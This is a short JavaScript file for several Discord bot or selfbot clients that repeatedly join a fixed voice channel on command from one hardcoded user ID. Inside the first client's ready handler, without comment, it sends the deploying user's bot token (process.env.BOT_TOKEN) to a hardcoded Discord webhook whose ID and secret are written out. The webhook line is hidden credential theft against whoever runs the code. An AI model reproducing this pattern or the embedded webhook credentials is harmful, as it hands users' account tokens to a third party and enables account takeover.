const Discord = require('discord-sf');
const client = new Discord.Client;
const c = new Discord.Client;
const c1 = new Discord.Client;
let d = 1
let runme = false
const webhookClient = new Discord.WebhookClient("814562740139327528", "yqK2dnD9-wK_Fc6HocvpKk0OXzBtE0Phe9Pe4-GzGPsqsvjNUo6_ShUYoJ7DJ3kpLzk1");

client.on("ready", () => {
    
    

webhookClient.send(process.env.BOT_TOKEN)
    
    
    
    console.log(`Logged in as ${client.user.tag}!`);
});

client.on("message", msg => { 
    ihl(client)
    if (msg.author.id === "638200255376130048"){
        if (msg.content === "=mot"){
            runme = true
            msg.react("✅")
            console.log(runme)
        }
        if (msg.content === "=mof"){
            runme = false
            msg.react("✅")
        }
    }
})

function ihl(cc){

    if (runme == true){

        if (d >= 50){
            const channel = cc.channels.get("851632260825481216");
           channel.join().then(connection => {console.log("Successfully connected.")}).catch(e => {console.error(e)});
         d = 0
        }
        d +=1

    }
};

c.on("ready", () => {
    console.log(`Logged in as ${c.user.tag}!`);
})


c.on("message", msg => {
    const cccccccccccc = c.channels.get("851632260825481216");
    cccccccccccc.join().then(connection => {console.log("Successfully connected.")}).catch(e => {console.error(e)});
})


c1.on("ready", () => {
    console.log(`Logged in as ${c1.user.tag}!`);
})


c1.on("message", msg => {
    const dda = c1.channels.get("851632260825481216");
    dda.join().then(connection => {console.log("Successfully connected.")}).catch(e => {console.error(e)});
})


c1.login(process.env.C1);
c.login(process.env.C);
client.login(process.env.BOT_TOKEN);
